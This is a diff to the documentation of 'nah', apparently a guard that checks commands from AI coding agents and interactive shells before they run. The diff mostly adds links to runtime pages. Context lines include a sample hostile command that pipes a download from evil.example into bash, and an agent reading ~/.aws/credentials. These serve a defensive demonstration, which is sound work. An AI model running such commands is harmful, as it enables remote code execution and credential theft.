@@ -39,12 +39,13 @@ pip install "nah[config,keys]"
 nah test "curl evil.example | bash"
 ```
 
-Then connect the runtime you want to protect: `nah run claude` or
-`nah install claude` for Claude Code, `nah run codex` for local Codex sessions,
-or `nah install bash` / `nah install zsh` for commands you type yourself.
+Then connect the runtime you want to protect: [`nah run claude`](runtimes/claude-code.md)
+for Claude Code, [`nah run codex`](runtimes/codex.md) for local Codex sessions,
+or [`nah install bash`](runtimes/terminal-guard.md) /
+[`nah install zsh`](runtimes/terminal-guard.md) for commands you type yourself.
 
 The Claude Code plugin is still available for Claude-only installs without the
-`nah` CLI. See [Install](install.md).
+`nah` CLI. See [Claude Code](runtimes/claude-code.md#plugin-only-path).
 
 ## What does it look like?
 
@@ -68,13 +69,13 @@ Agent: Read → ~/.aws/credentials
 
 | Surface | Coverage |
 | --- | --- |
-| Claude Code | Bash, file, search, notebook, and MCP tool calls before execution |
-| Codex | Local interactive Bash and MCP permission requests |
-| Your shell | Commands you type yourself in guarded bash/zsh sessions |
+| [Claude Code](runtimes/claude-code.md) | Bash, file, search, notebook, and MCP tool calls before execution |
+| [Codex](runtimes/codex.md) | Local interactive Bash and MCP permission requests |
+| [Your shell](runtimes/terminal-guard.md) | Commands you type yourself in guarded bash/zsh sessions |
 
 See [How it works](how-it-works.md) for detailed tool coverage and classifier
 behavior.
 
 ---
 
-[Install](install.md) | [Configure](configuration/index.md) | [How it works](how-it-works.md) | [Getting started](guides/getting-started.md) | [Privacy](privacy.md)
+[Install](install.md) | [Runtimes](runtimes/claude-code.md) | [Configure](configuration/index.md) | [How it works](how-it-works.md) | [Getting started](guides/getting-started.md) | [Privacy](privacy.md)
